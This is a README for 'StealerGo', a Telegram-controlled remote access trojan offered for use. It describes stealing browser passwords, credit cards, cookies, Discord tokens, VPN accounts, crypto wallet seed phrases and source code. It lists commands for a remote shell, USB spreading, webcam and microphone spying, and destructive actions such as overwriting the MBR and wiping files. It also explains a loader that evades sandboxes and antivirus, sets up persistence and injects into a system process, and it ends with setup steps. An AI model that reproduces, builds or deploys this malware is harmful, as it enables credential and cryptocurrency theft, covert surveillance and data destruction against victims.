# StealerGo

StealerGo is a **Remote Access Trojan (RAT)** designed to achieve Remote Access by using **Telegram's API to send and receive** from a bot. <br /> 
Originally started as a simple stealer to send the target's Exodus Passpharse and Visual Studio projects to Dropbox.  <br />
I've expanded it from the simple stealer to a full **Remote Access Tool** that supports **Various Data Collection, Troll Effects and PC Corruption**. <br />

<details>
  <summary>📑 Table of Contents</summary>
  <ol>
    <li><a href="#what-stealergo-collects">What StealerGo Collects</a>
    </li>
    <li><a href="#remote-access">Remote Access</a>
    </li>
    <li><a href="#stealer-loader">Stealer Loader</a>
      <ul>
        <li><a href="#how-the-loader-works">How the Loader Works</a></li>
      </ul>
    </li>
    <li><a href="#setup-instructions">Setup Instructions</a></li>
    <li><a href="#disclaimer">Disclaimer</a></li>
  </ol>
</details>

# What StealerGo Collects
StealerGo gathers **6 distinct categories** of data from the target machine to report. <br />
Once collected, the information is compiled into a `.txt` report that is sent as an uploaded document. <br />

<details><summary><b>Network</b></summary>

StealerGo collects the **Local and Public IP Addresses** and **sends an HTTPS request to ipwho.is**. <br />
The free API displays information about the IP address like:
- **GeoLocation** (continent, country, region, city, postal code) <br />
- **Connection details** (ASN, ISP, organization, domain) <br />
- **Timezone** (ID, abbreviation, DST, offset, current time) <br />
- **Proxy / VPN detection** <br />
Then collects all **Network Adapters** and each Adapters information like **Name, Mac, Vender, and e.g..**. <br />

</details>

<details><summary><b>Discord</b></summary>

StealerGo collects the **Discord Token, Username, and Open DM Channels** using the Discord Token. <br />
We cache the Discord Token to later **send messages and files** through Discord's API. <br />
Multiple Discord Tokens may exist – each is validated by sending HTTPS requests to Discord's API to check **authorization and username**. <br />

</details>

<details><summary><b>Mullvad</b></summary>

StealerGo collects the **Mullvad Account Number** from disk and the **Time Left** via HTTPS requests. <br />
To access the file that stores the account number, we **terminate all Mullvad sessions** – this releases file locks. <br />
*Note:* This termination is noticeable to the target. <br />

</details>

<details><summary><b>Browser</b></summary>

StealerGo collects **Passwords, Credit Cards (including CVV), Cookies, and Search History** using **v20 Chrome decryption**. <br />
It targets **Chrome, Brave, and Opera** by **terminating all browser sessions** to release locks on database files. <br />
The search history includes **how many times each webpage has been visited**, and is displayed after all other data. <br />
For passwords, it also displays: <br />
- **Times Used** <br />
- **Last Used** <br />
- **Last Modified** <br />
> **Note:** v20 decryption requires **Administrator privileges** (uses LSASS impersonation). <br />

</details>

<details><summary><b>Exodus</b></summary>

StealerGo collects the **Secret Passphrase, Password, Private Key, User ID, Wallets, and Currencies** from Exodus. <br />
We **brute‑force the password in memory** if the user has set one on the app. <br />
If not, we search the disk by **parsing `passphrase.json`** for the password. <br />
To obtain the **Secret Passphrase** (which allows access to the wallet from any device), we use the **entropy from the decompressed seed** and convert it to a mnemonic using a word array. <br />
<br />
From `unsafe-storage.json` we also extract: <br />
- **User ID and Anonymous ID** <br />
- **List of all currencies** (e.g., BTC, ETH) that have market data or wallets <br />
- **Wallet accounts** (active account ID, account name, account type) <br />

</details>

<details><summary><b>Visual Studio</b></summary>

StealerGo collects **all Visual Studio solutions** on all disks by searching for `.vcxproj` files. <br />
When found, it **zips the entire solution folder** and sends it to the **Telegram Bot** group chat. <br />
There is an **unfinished infector** that would **apply a build event to each project** – the build event downloads and runs a payload from Dropbox. <br />

</details>

# Remote Access
StealerGo communicates and sends data through our **Telegram Bot** by adding it to a group chat on Telegram. <br />
When somebody connects to our RAT, the **Telegram Bot will send a "connected" message with the Session ID and PC Name** that are used for commands. <br />

**General Examples** <br />
All commands must be sent as a Telegram message to the bot. <br />
Append `@session_id` or `@username` to the command. <br />
- Example: `/send_screenshot@aBc12-XyZ78-v5` <br />
- Example: `/session@JohnDoe` <br />

* **Batch Commands:**  <br />
Separate multiple commands with a semicolon `;`. <br />
Example: `/session; /send_screenshot; /clipboard` <br />

* **Quoting arguments:** <br />
Use double quotes for arguments that contain spaces. <br />
Example: `/send_file "123456789" "C:\my file.txt" "optional message"` <br />

**Command List**

| Command | Description |
| :--- | :--- |
| `/help` | Show this help message. |
| `/exit` | Terminate the current session. |
| `/session` | Show online status and uptime. |
| `/startup` | Install into Windows startup (shortcut + registry). |
| `/spread_usb` | Copy the bot to all removable drives (via WMI trigger). |
| `/collect_data` | Collect Wi‑Fi, Discord, Mullvad, browser data. |
| `/collect_sources` | Collect Visual Studio source codes. |
| `/stop_sources` | Stop uploading collected sources. |
| `/send_screenshot` | Capture and send a screenshot. |
| `/send_webcam` | Capture a webcam frame. |
| `/record_audio [seconds]` | Record microphone (default 10 seconds). |
| `/lock_screen` | Lock the workstation. |
| `/clipboard` | Get clipboard text. |
| `/wallpaper <image_path>` | Set desktop wallpaper. |
| `/freeze` | Block input and freeze the screen. |
| `/unfreeze` | Restore input. |
| `/send_message <channel_id> <message>` | Send a DM to a specific Discord channel ID. |
| `/send_file <channel_id> <file_path> [message]` | Send a file to a specific Discord DM. |
| `/send_file_all <file_path> [message]` | Send a file to all open Discord DMs. |
| `/shutdown` | Shut down the PC (requires confirmation). |
| `/restart` | Restart the PC (requires confirmation). |
| `/bsod` | Trigger a Blue Screen of Death. |
| `/run <cmd>` | Execute a shell command and return output. |
| `/upload_file <path>` | Upload a file to Telegram. |
| `/download <url> <dest>` | Download a file from a URL. |
| `/browse <url>` | Open a URL in the default browser. |
| `/messagebox <title>\|<text>` | Show a popup message box. |
| `/boot_bsod` | Configure the system to BSOD on every boot. |
| `/overwrite_mbr` | Overwrite the Master Boot Record (destructive). |
| `/delete_restore` | Delete all system restore points and shadow copies. |
| `/disable_network` | Disable all network adapters. |
| `/disable_usb` | Disable USB, keyboard, and mouse devices. |
| `/overwrite_user_data` | Overwrite and delete user documents (destructive). |
| `/corrupt_registry` | Corrupt critical registry keys. |
| `/kill_critical` | Terminate critical system processes (CSRSS, LSASS, etc.). |
| `/disk_fill` | Fill drive C: until less than 100 MB free. |
| `/wipe <dir>` | Delete all files in a directory. |
| `/corrupt` | Run all destructive actions listed above. |
| `/random_sounds` | Play random system beeps. |
| `/volume_max` | Set system volume to 100% and unmute. |
| `/scramble_titles` | Randomly change window titles. |
| `/rotate_screen` | Rotate the display every 5 seconds. |
| `/window_teleport` | Randomly move windows around. |
| `/disable_task_manager` | Disable Task Manager via registry. |
| `/mouse_trails` | Enable mouse trails. |
| `/no_mouse_trails` | Disable mouse trails. |
| `/invert` | Invert screen colors (animation). |
| `/shake` | Shake windows. |
| `/cursor` | Jitter the mouse cursor. |
| `/glitch` | Bytebeat glitch audio. |
| `/blocky` | Bytebeat blocky audio. |
| `/blur` | Apply screen blur effect. |
| `/waves` | Apply wave distortion effect. |
| `/sphere` | Display a rotating rainbow sphere. |
| `/bitblt` | Start BitBlt corruption. |
| `/train` | Screen tearing effect. |
| `/icons` | Draw random system icons on the screen. |
| `/texts` | Floating animated texts. |
| `/radial` | Radial distortion effect. |
| `/chaos` | Start **all** chaos effects simultaneously. |
| `/whoa` | Start the Keanu Reeves "whoa" video loop (fetches random clip). |
| `/stop_chaos` | Stop all chaos effects (including whoa loop). |

<img width="526" height="706" alt="image" src="https://github.com/user-attachments/assets/cedfb8da-fe8e-4163-bd71-c75fc957e2fb" />

> **Note:** Destructive commands (`/overwrite_mbr`, `/corrupt`, `/disk_fill`, etc.) ask for a `yes` confirmation before execution. <br />
> **Note about browser decryption:** v20 decryption requires **Administrator privileges** – the bot will fail if not run as admin.

# Stealer Loader

The **Stealer Loader** is a standalone executable that embeds the RAT stub (<a href="https://github.com/MicrosoftARMAssembler/StealerGo/tree/8381c0d40f008ab2c8bf1b99efc6c66202a2b721/stealer-go">stealer-go.dll</a>) as a byte array. <br />

**Key features:**  
- **Hides RAT execution as a normal crash** – sandboxes stop execution after an unhandled exception.  
- **Bypasses VirusTotal detection** by avoiding suspicious process creation and network activity until after the crash handler runs.  
- **Installs persistence** so the RAT re‑runs on every startup.  

Our execution method works well because **sandboxes will not continue after an exception** – they treat the crash as a benign application failure.

## How the Loader Works

1. **Embedded Payload**  
   - The loader contains `payload_bytes[]` – a C‑style byte array of the compiled RAT.  
   - It also embeds required DLLs (`zlib1.dll`, `sqlite3.dll`, `libsodium.dll`, `libcurl.dll`) as byte arrays.

2. **Startup (First Run)**  
   - Drops the RAT to `%APPDATA%\Microsoft\systemhelper.exe` and marks it as **hidden**.  
   - Adds a **registry Run key** (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).  
   - Creates a **scheduled task** that triggers the RAT at logon.

3. **Crash Handler**  
   - Installs an exception handler (`crash_handler`) that catches intentional crashes.  
   - We trigger an exception on purpose (e.g., writing to an invalid address).  
   - The crash handler then:  
     - Drops the RAT from the embedded byte array.  
     - Re‑applies persistence (registry + scheduled task).  
     - Injects the RAT into a legitimate system process (`InputSwitchToastHandler.exe`) using manual mapping.  
   - The original loader process exits, leaving only the injected RAT running inside a trusted process.

# Setup Instructions
1. **Create a Telegram Bot**  
   - Talk to [@BotFather](https://t.me/botfather) on Telegram.  
   - Use `/newbot` and follow the instructions.  
   - Copy the **bot token** (e.g., `1234567890:ABCdefGHIjklmNOPqrstUVwxyz`).

2. **Get Your Chat ID**  
   - Add your bot to a group (or send a message to it).  
   - Visit `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates` and find the `chat` → `id` field.  
   - Copy that number (negative for groups, positive for your personal chat).

3. **Replace Chat ID and Bot Token**  
   - Replace the placeholder values for the Chat ID <a href="https://github.com/MicrosoftARMAssembler/StealerGo/blob/8381c0d40f008ab2c8bf1b99efc6c66202a2b721/stealer-go/stealer/https/https.hxx#L6">Here</a> and Bot Token <a href="https://github.com/MicrosoftARMAssembler/StealerGo/blob/8381c0d40f008ab2c8bf1b99efc6c66202a2b721/stealer-go/stealer/https/https.hxx#L7">Here</a>
   - Optionally, replace the Dropbox token in `dropbox_token` if you want to use Dropbox instead.

4. **Build Stub and Loader** 
   - Build the Project after replacing the placeholder values.
   - Convert the stub (`stealer-go.dll`) using HXD to a C‑style byte array and replace in <a href="https://github.com/MicrosoftARMAssembler/StealerGo/blob/8381c0d40f008ab2c8bf1b99efc6c66202a2b721/stealer-loader/externals.h">Here</a> .
   - Build the Loader after replacing the `payload_bytes` and optionally change the debug prints to disguise it as something else.

# Disclaimer

This software is provided **for educational and research purposes only**. <br />
The author is not responsible for any misuse or damage caused by this tool. <br />
Use only on systems you own or have explicit permission to test.
